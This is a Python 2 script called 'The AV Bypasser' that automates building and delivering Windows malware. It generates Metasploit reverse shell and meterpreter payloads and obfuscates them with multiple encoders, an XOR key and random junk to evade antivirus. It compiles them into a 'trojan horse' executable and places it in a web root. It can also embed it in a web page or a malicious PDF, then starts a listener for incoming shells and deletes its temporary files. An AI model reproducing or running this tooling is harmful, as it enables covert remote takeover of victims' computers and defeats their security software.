#!/usr/bin/python
#coding: utf-8
from struct import *
import os
import commands
import subprocess
import random 
os.system("clear")
os.chdir("/opt/metasploit/apps/pro/msf3")
print "*********************************************************"
  
print "..__,__,.___.  _,_ _____s,     ____%   ._____c  _a/   _,, "
print "]. .; .{  :.   .;   =.   ^     .=   <,  .=   -`  e4;   ff  "
print "]  .;  ]  =.   .;   :.          =   -{   =       f:5,  ff  "
print "   .;     =:   .;   =: ]       .=    ).  > .[    [ +6  ff  "
print "   .;     :=--~+'.  ::==|        =    <  .=~!,    f  )c f  "
print "   .;     :.   .;   =. ]        =    ].  =  [    f  -3;[F  "
print "   .;     =.   .;   :.    /    .=   .c  .=       f   .5'f   "
print "   :=     =:   .<   =:   _'    .> . %`   >   ./  (    +'f  "
print "   ~`-   -'-   ~`- -'-~~'-     ' ~''^    =~'~    ;`    'f  "

 
print "********************************************************* "
print "                              The AV Bypasser"
print "           			By Vishnu aka 34gLe 3Ye		    "
print " = = = = = = = = = = = = = = = = = = = = = = = = = = = = "
host = raw_input("LHOST ==> [Type e if you are using External IP] ").strip()
if host == 'e':
	os.system("curl -x http://172.16.0.3:3128 ifconfig.me >> /home/user/My\ Works/DEN/ip.txt")
	lhost = commands.getoutput('cat /home/user/My\ Works/DEN/ip.txt')
	os.system("rm ip.txt")
	os.system("clear")
	print "[*] lhost: ", lhost
else:
	lhost = host
	print "[*] lhost: ", lhost
lport = raw_input("lport ?").strip()
print "[*] lport: ", lport
print "**************************************"
#print " Recommended : use reverse_tcp payloads "
print "   "
print "1) windows/shell_reverse_tcp"
print "2) windows/shell/reverse_tcp"
print "3) windows/shell/reverse_tcp_dns"
print "4) windows/shell/reverse_http"
print "5) windows/meterpreter/reverse_tcp"
print "6) windows/meterpreter/reverse_tcp_dns"
print "7) windows/meterpreter/reverse_http"
print "**************************************"
payload = raw_input("Select a payload (1-8):").strip()
payload_raw = "temp.raw"
out = "temp.c"
structure = "structure.c"
key = random.randint(0,255)
print "[*] Generating random junk..."
print "[*] Randomizing file size..."
randomSize = random.randint(20480,25600)

junkA = ""
junkB = "" 

junkA += "\""
for i in xrange(1,randomSize):
	junkA += chr(random.randint(65,90)) 
junkA +=  "\""

junkB += "\""
for i in xrange(0,randomSize):
	junkB += chr(random.randint(65,90)) 
junkB +=  "\""



print "[*] Generating metasploit shellcode..."
if payload == "1":
	os.system("./msfpayload windows/shell_reverse_tcp LHOST=%s LPORT=%s R | ./msfencode -t raw -e x86/shikata_ga_nai -c 8 | ./msfencode -t raw -e x86/alpha_upper -c 2 | ./msfencode -t raw -o %s -e x86/countdown -c 4" % (lhost,lport,payload_raw))

elif payload == "2":
	os.system("./msfpayload windows/shell/reverse_tcp LHOST=%s LPORT=%s R | ./msfencode -t raw -e x86/shikata_ga_nai -c 8 | ./msfencode -t raw -e x86/alpha_upper -c 2 | ./msfencode -t raw -o %s -e x86/countdown -c 4" % (lhost,lport,payload_raw))

elif payload == "3":
	os.system("./msfpayload windows/shell/reverse_tcp_dns LHOST=%s LPORT=%s R | ./msfencode -t raw -e x86/shikata_ga_nai -c 8 | ./msfencode -t raw -e x86/alpha_upper -c 2 | ./msfencode -t raw -o %s -e x86/countdown -c 4" % (lhost,lport,payload_raw))

elif payload == "4":
	os.system("./msfpayload windows/shell/reverse_http LHOST=%s LPORT=%s R | ./msfencode -t raw -e x86/shikata_ga_nai -c 8 | ./msfencode -t raw -e x86/alpha_upper -c 2 | ./msfencode -t raw -o %s -e x86/countdown -c 4" % (lhost,lport,payload_raw))

elif payload == "5":
	os.system("./msfpayload windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s R | ./msfencode -t raw -e x86/shikata_ga_nai -c 8 | ./msfencode -t raw -e x86/alpha_upper -c 2 | ./msfencode -t raw -o %s -e x86/countdown -c 4" % (lhost,lport,payload_raw))

elif payload == "6":
	os.system("./msfpayload windows/meterpreter/reverse_tcp_dns LHOST=%s LPORT=%s R | ./msfencode -t raw -e x86/shikata_ga_nai -c 8 | ./msfencode -t raw -e x86/alpha_upper -c 2 | ./msfencode -t raw -o %s -e x86/countdown -c 4" % (lhost,lport,payload_raw))

elif payload == "7":
	os.system("./msfpayload windows/meterpreter/reverse_http LHOST=%s LPORT=%s R | ./msfencode -t raw -e x86/shikata_ga_nai -c 8 | ./msfencode -t raw -e x86/alpha_upper -c 2 | ./msfencode -t raw -o %s -e x86/countdown -c 4" % (lhost,lport,payload_raw))


a = open(payload_raw,"rb")
b = open(out,"w")

payload_raw = a.read()
tempArray = []
outArray = []
x = 0

print "[*] Encoding with XOR key: ", hex(key) 
print "[*] Obfuscating shellcode..."
length = int(len(payload_raw)*2)

for i in xrange(0,length):
	if i % 2 == 0:
		tempArray.append(unpack("B",payload_raw[x])[0]^key)
		x += 1
	else:
		randomByte = random.randint(65,90)
		tempArray.append(randomByte)	
for i in range(0,len(tempArray)):
	tempArray[i]="\\x%x"%tempArray[i]
for i in range(0,len(tempArray),15):
	outArray.append('\n"'+"".join(tempArray[i:i+15])+"\"")
outArray = "".join(outArray)

divide = "i % 2;"
  
open_structure = open(structure).read()
code = open_structure % (junkA,outArray,junkB,key,length,divide)
b.write(code)
b.flush()

print "[*] Compiling trojan horse..."
os.system("x86_64-w64-mingw32-gcc -mwindows temp.c")
print "[*] Stripping out the debugging symbols..."
os.system("strip --strip-debug a.exe")
print "[*] Moving trojan horse to web root..."
os.system("mv a.exe /var/www/backdoor.exe")
print "**************************************"
print "a) apache server"
print "b) Embedd payload to <LHOST_IP/index.html>"
print "c) create evil PDF"
print "**************************************"
attack = raw_input("Select an attack (a OR b OR c):").strip()
if attack == "a":
	print "[*] Starting apache..."
	os.system('sh -c "service apache2 start; sleep 4"')
if attack == "b":
	subprocess.Popen(args=["gnome-terminal", "--command=sudo sh hunt.sh"]).pid
if attack == "c":
	original = raw_input("path to original pdf: ").strip()
	print "[*] Creating evil PDF..."
	os.system("./msfcli windows/fileformat/adobe_pdf_embedded_exe EXE::Custom=/var/www/backdoor.exe FILENAME=backdoor.pdf INFILENAME=%s E" % (original))
	os.system("mv /root/.msf4/local/backdoor.pdf /var/www")
	print "[*] moving backdoor.pdf to webroot"
print "[*] lhost: ", lhost
print "[*] lport: ", lport





if payload == "1":
	print "[*] Starting the netcat listener..."
	os.system("nc -lvp %s" % (lport))
	
	
elif payload == "2":
	print "[*] Starting the multi handler..."
	os.system("./msfcli multi/handler PAYLOAD=windows/shell/reverse_tcp LHOST=%s LPORT=%s E" % (lhost, lport))
	
	
elif payload == "3":
	print "[*] Starting the multi handler..."
	os.system("./msfcli multi/handler PAYLOAD=windows/shell/reverse_tcp_dns LHOST=%s LPORT=%s E" % (lhost, lport))
	
	
elif payload == "4":
	print "[*] Starting the multi handler..."
	os.system("./msfcli multi/handler PAYLOAD=windows/shell/reverse_http LHOST=%s LPORT=%s E" % (lhost, lport))
	
	
elif payload == "5":
	print "[*] Starting the multi handler..."
	os.system("./msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s E" % (lhost, lport))
	
	
elif payload == "6":
	print "[*] Starting the multi handler..."
	os.system("./msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp_dns LHOST=%s LPORT=%s E" % (lhost, lport))
	
	
elif payload == "7":
	print "[*] Starting the multi handler..."
	os.system("./msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_http LHOST=%s LPORT=%s E" % (lhost, lport))



print "[*] Purging traces..."
os.system("rm temp.c")
os.system("rm temp.raw")
print "[*] Successfully exited. Bye :-)"





